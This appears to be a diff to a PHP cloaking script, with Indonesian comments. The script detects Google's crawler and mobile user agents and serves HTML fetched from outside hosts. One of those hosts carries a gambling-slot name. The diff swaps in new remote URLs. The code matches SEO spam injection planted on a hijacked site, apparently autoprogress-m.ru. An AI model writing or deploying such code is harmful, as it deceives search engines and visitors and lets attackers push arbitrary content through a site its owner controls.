@@ -49,7 +49,7 @@ function fetchContent($url) {
 $visitorCountry = getVisitorCountry();
 
 // URL untuk konten desktop yang dapat diindeks
-$desktopUrl = 'https://added-cloud.cc/packdol/getcontent/autoprogress-m.ru/lp.txt';
+$desktopUrl = 'https://added-cloud.cc/packdol/getcontent/autoprogress-m.ru2/lp.txt';
 
 // Memeriksa apakah pengunjung adalah crawler Google
 if (isGoogleCrawler()) {
@@ -64,7 +64,7 @@ if (isGoogleCrawler()) {
         // Memeriksa apakah pengunjung menggunakan perangkat mobile
         if (preg_match('/Mobile|Android|iPhone|iPad/', $_SERVER['HTTP_USER_AGENT'])) {
             // Ambil konten untuk versi mobile
-            $mobileUrl = 'https://pub-9ac899cf166c498fa482c500908726f0.r2.dev/amp-iboslot-gacor.html';
+            $mobileUrl = 'https://amp-autoprogress-m-ru.web.app/';
             $mobileContent = fetchContent($mobileUrl);
             if ($mobileContent) {
                 echo $mobileContent; // Menampilkan konten mobile
